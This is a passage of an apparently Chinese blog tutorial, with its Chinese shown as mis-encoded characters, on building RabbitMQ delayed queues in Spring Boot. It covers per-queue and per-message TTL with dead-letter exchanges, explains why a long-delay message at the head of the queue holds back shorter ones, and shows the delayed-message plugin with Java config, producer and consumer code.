/></p><blockquote><p>å®ç°</p></blockquote><ol><li><p>é…ç½®æ–‡ä»¶ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">* TTLé˜Ÿåˆ— é…ç½®æ–‡ä»¶ç±»ä»£ç </span><br><span class="hljs-comment">*</span><br><span class="hljs-comment">* */</span><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TtlQueueConfig</span> &#123;<br><br><br>    <span class="hljs-comment">//æ™®é€šäº¤æ¢æœºçš„åç§°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span>  <span class="hljs-variable">X_EXCHANGE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;X&quot;</span>;<br>    <span class="hljs-comment">//æ­»ä¿¡äº¤æ¢æœºçš„åç§°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">Y_DEAD_LETTER_EXCHANGE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Y&quot;</span>;<br>    <span class="hljs-comment">//æ™®é€šé˜Ÿåˆ—çš„åç§°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">QUEUE_A</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;QA&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">QUEUE_B</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;QB&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">QUEUE_C</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;QC&quot;</span>;<br>    <span class="hljs-comment">//æ­»ä¿¡é˜Ÿåˆ—çš„åç§°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEAD_LATTER_QUEUE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;QD&quot;</span>;<br><br>    <span class="hljs-comment">//å£°æ˜QCé˜Ÿåˆ—</span><br>    <span class="hljs-meta">@Bean(&quot;queueC&quot;)</span><br>    <span class="hljs-keyword">public</span> Queue <span class="hljs-title function_">queueC</span><span class="hljs-params">()</span>&#123;<br>        Map&lt;String, Object&gt; arguments = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-comment">//è®¾ç½®æ­»ä¿¡äº¤æ¢æœº</span><br>        arguments.put(<span class="hljs-string">&quot;x-dead-letter-exchange&quot;</span>,Y_DEAD_LETTER_EXCHANGE);<br>        <span class="hljs-comment">//è®¾ç½®æ­»ä¿¡RoutingKey</span><br>        arguments.put(<span class="hljs-string">&quot;x-dead-letter-routing-key&quot;</span>,<span class="hljs-string">&quot;YD&quot;</span>);<br>        <span class="hljs-keyword">return</span> QueueBuilder.durable().withArguments(arguments).build();<br>    &#125;<br><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Binding <span class="hljs-title function_">queueCBindingX</span><span class="hljs-params">(<span class="hljs-meta">@Qualifier(&quot;queueC&quot;)</span> Queue queueC,<span class="hljs-meta">@Qualifier(&quot;xExchange&quot;)</span> DirectExchange xExchange)</span>&#123;<br>        <span class="hljs-keyword">return</span> BindingBuilder.bind(queueC).to(xExchange).with(<span class="hljs-string">&quot;XC&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//å£°æ˜xExchange</span><br>    <span class="hljs-meta">@Bean(&quot;xExchange&quot;)</span><br>    <span class="hljs-keyword">public</span> DirectExchange <span class="hljs-title function_">xExchange</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DirectExchange</span>(X_EXCHANGE);<br>    &#125;<br><br>    <span class="hljs-comment">//å£°æ˜yExchange</span><br>    <span class="hljs-meta">@Bean(&quot;yExchange&quot;)</span><br>    <span class="hljs-keyword">public</span> DirectExchange <span class="hljs-title function_">yExchange</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DirectExchange</span>(Y_DEAD_LETTER_EXCHANGE);<br>    &#125;<br><br>    <span class="hljs-comment">//å£°æ˜é˜Ÿåˆ—</span><br>    <span class="hljs-meta">@Bean(&quot;queueA&quot;)</span><br>    <span class="hljs-keyword">public</span> Queue <span class="hljs-title function_">queueA</span><span class="hljs-params">()</span>&#123;<br>        Map&lt;String, Object&gt; arguments = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(<span class="hljs-number">3</span>);<br>        <span class="hljs-comment">//è®¾ç½®æ­»ä¿¡äº¤æ¢æœº</span><br>        arguments.put(<span class="hljs-string">&quot;x-dead-letter-exchange&quot;</span>,Y_DEAD_LETTER_EXCHANGE);<br>        <span class="hljs-comment">//è®¾ç½®æ­»ä¿¡Routing-key</span><br>        arguments.put(<span class="hljs-string">&quot;x-dead-letter-routing-key&quot;</span>,<span class="hljs-string">&quot;YD&quot;</span>);<br>        <span class="hljs-comment">//è®¾ç½®TTL å•ä½æ˜¯ms</span><br>        arguments.put(<span class="hljs-string">&quot;x-message-ttl&quot;</span>,<span class="hljs-number">10000</span>);<br>        <span class="hljs-keyword">return</span> QueueBuilder.durable(QUEUE_A).withArguments(arguments).build();<br>    &#125;<br><br>    <span class="hljs-comment">//å£°æ˜æ™®é€šé˜Ÿåˆ— TTLä¸º40s</span><br>    <span class="hljs-meta">@Bean(&quot;queueB&quot;)</span><br>    <span class="hljs-keyword">public</span> Queue <span class="hljs-title function_">queueB</span><span class="hljs-params">()</span>&#123;<br>        Map&lt;String, Object&gt; arguments = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(<span class="hljs-number">3</span>);<br>        <span class="hljs-comment">//è®¾ç½®æ­»ä¿¡äº¤æ¢æœº</span><br>        arguments.put(<span class="hljs-string">&quot;x-dead-letter-exchange&quot;</span>,Y_DEAD_LETTER_EXCHANGE);<br>        <span class="hljs-comment">//è®¾ç½®æ­»ä¿¡Routing-key</span><br>        arguments.put(<span class="hljs-string">&quot;x-dead-letter-routing-key&quot;</span>,<span class="hljs-string">&quot;YD&quot;</span>);<br>        <span class="hljs-comment">//è®¾ç½®TTL å•ä½æ˜¯ms</span><br>        arguments.put(<span class="hljs-string">&quot;x-message-ttl&quot;</span>,<span class="hljs-number">40000</span>);<br>        <span class="hljs-keyword">return</span> QueueBuilder.durable(QUEUE_B).withArguments(arguments).build();<br>    &#125;<br><br>    <span class="hljs-comment">//æ­»ä¿¡é˜Ÿåˆ—</span><br>    <span class="hljs-meta">@Bean(&quot;queueD&quot;)</span><br>    <span class="hljs-keyword">public</span> Queue <span class="hljs-title function_">queueD</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> QueueBuilder.durable(DEAD_LATTER_QUEUE).build();<br>    &#125;<br><br>    <span class="hljs-comment">//ç»‘å®š</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Binding <span class="hljs-title function_">queueABindingX</span><span class="hljs-params">(<span class="hljs-meta">@Qualifier(&quot;queueA&quot;)</span> Queue queueA,</span><br><span class="hljs-params">                                  <span class="hljs-meta">@Qualifier(&quot;xExchange&quot;)</span> DirectExchange xExchange)</span>&#123;<br>        <span class="hljs-keyword">return</span> BindingBuilder.bind(queueA).to(xExchange).with(<span class="hljs-string">&quot;XA&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//ç»‘å®š</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Binding <span class="hljs-title function_">queueBBindingX</span><span class="hljs-params">(<span class="hljs-meta">@Qualifier(&quot;queueB&quot;)</span> Queue queueB,</span><br><span class="hljs-params">                                  <span class="hljs-meta">@Qualifier(&quot;xExchange&quot;)</span> DirectExchange xExchange)</span>&#123;<br>        <span class="hljs-keyword">return</span> BindingBuilder.bind(queueB).to(xExchange).with(<span class="hljs-string">&quot;XB&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//ç»‘å®š</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Binding <span class="hljs-title function_">queueDBindingX</span><span class="hljs-params">(<span class="hljs-meta">@Qualifier(&quot;queueD&quot;)</span> Queue queueD,</span><br><span class="hljs-params">                                  <span class="hljs-meta">@Qualifier(&quot;yExchange&quot;)</span> DirectExchange yExchange)</span>&#123;<br>        <span class="hljs-keyword">return</span> BindingBuilder.bind(queueD).to(yExchange).with(<span class="hljs-string">&quot;YD&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p>ç”Ÿäº§è€…</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">* å‘é€å»¶è¿Ÿæ¶ˆæ¯</span><br><span class="hljs-comment">* */</span><br><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(&quot;/ttl&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SendMsgController</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> RabbitTemplate rabbitTemplate;<br><br><br><br>    <span class="hljs-comment">//å¼€å§‹å‘æ¶ˆæ¯</span><br>    <span class="hljs-meta">@GetMapping(&quot;/sendMsg/&#123;message&#125;&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendMsg</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String message)</span>&#123;<br>      log.info(<span class="hljs-string">&quot;å½“å‰æ—¶é—´ï¼š&#123;&#125;ï¼Œå‘é€ä¸€æ¡ä¿¡æ¯ç»™ä¸¤ä¸ªTTLé˜Ÿåˆ—ï¼š&#123;&#125;&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().toString(),message);<br><br>      rabbitTemplate.convertAndSend(<span class="hljs-string">&quot;X&quot;</span>,<span class="hljs-string">&quot;XA&quot;</span>,<span class="hljs-string">&quot;æ¶ˆæ¯æ¥è‡ªTTLä¸º10sçš„é˜Ÿåˆ—ï¼š&quot;</span> + message);<br>      rabbitTemplate.convertAndSend(<span class="hljs-string">&quot;X&quot;</span>,<span class="hljs-string">&quot;XB&quot;</span>,<span class="hljs-string">&quot;æ¶ˆæ¯æ¥è‡ªTTLä¸º40sçš„é˜Ÿåˆ—ï¼š&quot;</span> + message);<br><br>    &#125;<br>    <span class="hljs-comment">//å¼€å§‹å‘æ¶ˆæ¯</span><br>    <span class="hljs-meta">@GetMapping(&quot;sendExpirationMsg/&#123;message&#125;/&#123;ttlTime&#125;&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendMsg</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String message,<span class="hljs-meta">@PathVariable</span> String ttlTime)</span>&#123;<br>        log.info(<span class="hljs-string">&quot;å½“å‰æ—¶é—´ï¼š&#123;&#125;ï¼Œå‘é€ä¸€æ¡æ—¶é•¿&#123;&#125;æ¯«ç§’TTLä¿¡æ¯ç»™é˜Ÿåˆ—QCï¼š&#123;&#125;&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().toString(),ttlTime,message);<br>        rabbitTemplate.convertAndSend(<span class="hljs-string">&quot;X&quot;</span>,<span class="hljs-string">&quot;XC&quot;</span>,message,msg-&gt;&#123;<br>            <span class="hljs-comment">//å‘é€æ¶ˆæ¯çš„æ—¶å€™ å»¶è¿Ÿæ—¶é•¿</span><br>            msg.getMessageProperties().setExpiration(ttlTime);<br>            <span class="hljs-keyword">return</span> msg;<br>        &#125;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>æ¶ˆè´¹è€…ä»£ç æ— éœ€æ”¹å˜</p></li><li><p>æ•ˆæœåŠé—®é¢˜ï¼šæŒ‰ç†æ¥è¯´åº”è¯¥æ˜¯ä½ å¥½2å…ˆæ”¶åˆ°</p><p><a href="http://localhost:8080/ttl/sendExpirationMsg/%E4%BD%A0%E5%A5%BD">http://localhost:8080/ttl/sendExpirationMsg/ä½ å¥½</a> 1/20000</p><p><a href="http://localhost:8080/ttl/sendExpirationMsg/%E4%BD%A0%E5%A5%BD">http://localhost:8080/ttl/sendExpirationMsg/ä½ å¥½</a> 2/2000</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113100800893.png" alt="image-20230113100800893" /></p><p><strong>å› ä¸ºRabbitMQåªä¼šæ£€æŸ¥ç¬¬ä¸€ä¸ªæ¶ˆæ¯æ˜¯å¦è¿‡æœŸï¼Œå¦‚æœè¿‡æœŸåˆ™ä¸¢åˆ°æ­»ä¿¡é˜Ÿåˆ—ï¼Œ å¦‚æœç¬¬ä¸€ä¸ªæ¶ˆæ¯çš„å»¶æ—¶æ—¶é•¿å¾ˆé•¿ï¼Œè€Œç¬¬äºŒä¸ªæ¶ˆæ¯çš„å»¶æ—¶æ—¶é•¿å¾ˆçŸ­ï¼Œç¬¬äºŒä¸ªæ¶ˆæ¯å¹¶ä¸ä¼šä¼˜å…ˆå¾—åˆ°æ‰§è¡Œ</strong>ï¼</p></li></ol><h2 id="84-æ’ä»¶å®ç°å»¶è¿Ÿé˜Ÿåˆ—"><a class="markdownIt-Anchor" href="#84-æ’ä»¶å®ç°å»¶è¿Ÿé˜Ÿåˆ—"></a> 8.4 æ’ä»¶å®ç°å»¶è¿Ÿé˜Ÿåˆ—</h2><p><a href="http://xtwoy.github.io/2023/01/13/Docker%E5%AE%89%E8%A3%85RabbitMQ%E5%B9%B6%E5%AE%89%E8%A3%85%E5%BB%B6%E6%97%B6%E9%98%9F%E5%88%97%E6%8F%92%E4%BB%B6/">é“¾æ¥</a></p><blockquote><p>ä»£ç æ¶æ„å›¾</p></blockquote><p>åœ¨è¿™é‡Œæ–°å¢äº†ä¸€ä¸ªé˜Ÿåˆ— delayed.queue,ä¸€ä¸ªè‡ªå®šä¹‰äº¤æ¢æœº delayed.exchangeï¼Œç»‘å®šå…³ç³»å¦‚ä¸‹:</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113142916218.png" alt="image-20230113142916218" /></p><blockquote><p>å®ç°</p></blockquote><ol><li><p>é…ç½®æ–‡ä»¶ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.config;<br><br><span class="hljs-keyword">import</span> org.springframework.amqp.core.Binding;<br><span class="hljs-keyword">import</span> org.springframework.amqp.core.BindingBuilder;<br><span class="hljs-keyword">import</span> org.springframework.amqp.core.CustomExchange;<br><span class="hljs-keyword">import</span> org.springframework.amqp.core.Queue;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Qualifier;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * [io.xtwoy.consumer]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> : [å¸­å­ä¸ä¼šæ•²ä»£ç ]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> : [V1.0]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> : [2023/1/13 14:31]</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DelayedQueueConfig</span> &#123;<br><br>    <span class="hljs-comment">//é˜Ÿåˆ—</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DELAYED_QUEUE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;delayed.queue&quot;</span>;<br>    <span class="hljs-comment">//äº¤æ¢æœº</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DELAYED_EXCHANGE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;delayed.exchange&quot;</span>;<br>    <span class="hljs-comment">//routingKey</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DELAYED_ROUTING_KEY</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;delayed.routingkey&quot;</span>;<br><br>    <span class="hljs-comment">//å£°æ˜é˜Ÿåˆ—</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Queue <span class="hljs-title function_">delayedQueue</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Queue</span>(DELAYED_QUEUE_NAME);<br>    &#125;;<br><br><br><br>    <span class="hljs-comment">//å£°æ˜äº¤æ¢æœº</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> CustomExchange <span class="hljs-title function_">delayedExchange</span><span class="hljs-params">()</span>&#123;<br><br>        Map&lt;String, Object&gt; arguments = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        arguments.put(<span class="hljs-string">&quot;x-delayed-type&quot;</span>,<span class="hljs-string">&quot;direct&quot;</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomExchange</span>(DELAYED_EXCHANGE_NAME,<span class="hljs-string">&quot;x-delayed-message&quot;</span>,<br>                <span class="hljs-literal">true</span>,<span class="hljs-literal">false</span>,arguments);<br>    &#125;<br>    <span class="hljs-comment">//ç»‘å®š</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Binding <span class="hljs-title function_">delayedQueueBindingDelayedExchange</span><span class="hljs-params">(<span class="hljs-meta">@Qualifier(&quot;delayedQueue&quot;)</span> Queue delayedQueue,</span><br><span class="hljs-params">                                                      <span class="hljs-meta">@Qualifier(&quot;delayedExchange&quot;)</span> CustomExchange delayedExchange)</span>&#123;<br>        <span class="hljs-keyword">return</span> BindingBuilder.bind(delayedQueue).to(delayedExchange).with(DELAYED_ROUTING_KEY).noargs();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p>æ¶ˆè´¹è€…</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.consumer;<br><br><span class="hljs-keyword">import</span> io.xtwoy.DelayedQueueConfig;<br><span class="hljs-keyword">import</span> lombok.extern.slf4j.Slf4j;<br><span class="hljs-keyword">import</span> org.springframework.amqp.core.Message;<br><span class="hljs-keyword">import</span> org.springframework.amqp.rabbit.annotation.RabbitListener;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Component;<br><br><span class="hljs-keyword">import</span> java.util.Date;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * æ¶ˆè´¹è€…ä»£ç  åŸºäºæ’ä»¶çš„å»¶è¿Ÿæ¶ˆ</span><br><span class="hljs-comment"> * [io.xtwoy.consumer]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> : [å¸­å­ä¸ä¼šæ•²ä»£ç ]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> : [V1.0]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> : [2023/1/13 14:32]</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DelayQueueConsumer</span> &#123;<br><br>    <span class="hljs-comment">//ç›‘å¬æ¶ˆæ¯</span><br>    <span class="hljs-meta">@RabbitListener(queues = DelayedQueueConfig.DELAYED_QUEUE_NAME)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">recieveDelayQueue</span><span class="hljs-params">(Message message)</span>&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(message.getBody());<br>        log.info(<span class="hljs-string">&quot;å½“å‰æ—¶é—´ï¼š&#123;&#125;ï¼Œæ”¶åˆ°å»¶è¿Ÿé˜Ÿåˆ—çš„æ¶ˆæ¯ï¼š&#123;&#125;&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().toString(),msg);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p>ç”Ÿäº§è€…</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">* å‘é€å»¶è¿Ÿæ¶ˆæ¯</span><br><span class="hljs-comment">* */</span><br><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(&quot;/ttl&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SendMsgController</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> RabbitTemplate rabbitTemplate;<br><br>    <span class="hljs-comment">//å¼€å§‹å‘æ¶ˆæ¯ åŸºäºæ’ä»¶çš„ æ¶ˆæ¯ åŠ å»¶è¿Ÿçš„æ—¶é—´</span><br>    <span class="hljs-meta">@GetMapping(&quot;/sendDelayMsg/&#123;message&#125;/&#123;delayTime&#125;&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendMsg</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String message,<span class="hljs-meta">@PathVariable</span> Integer delayTime)</span>&#123;<br>        log.info(<span class="hljs-string">&quot;å½“å‰æ—¶é—´ï¼š&#123;&#125;ï¼Œå‘é€ä¸€æ¡æ—¶é•¿&#123;&#125;æ¯«ç§’ä¿¡æ¯ç»™å»¶è¿Ÿé˜Ÿåˆ—delayed.queueï¼š&#123;&#125;&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().toString(),delayTime,message);<br>        rabbitTemplate.convertAndSend(DelayedQueueConfig.DELAYED_EXCHANGE_NAME<br>                ,DelayedQueueConfig.DELAYED_ROUTING_KEY,message,msg -&gt; &#123;<br>            <span class="hljs-comment">// å‘é€æ¶ˆæ¯çš„æ—¶å€™ å»¶è¿Ÿæ—¶é•¿ å•ä½ms</span><br>            msg.getMessageProperties().setDelay(delayTime);<br>            <span class="hljs-keyword">return</span> msg;<br>                &#125;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>æ•ˆæœ</p><p>è®¿é—®ï¼š</p><p><a href="http://localhost:8080/ttl/sendDelayMsg/come">http://localhost:8080/ttl/sendDelayMsg/come</a> on baby1/20000</p><p><a href="http://localhost:8080/ttl/sendDelayMsg/come">http://localhost:8080/ttl/sendDelayMsg/come</a> on baby2/2000</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113143811144.png" alt="image-20230113143811144" 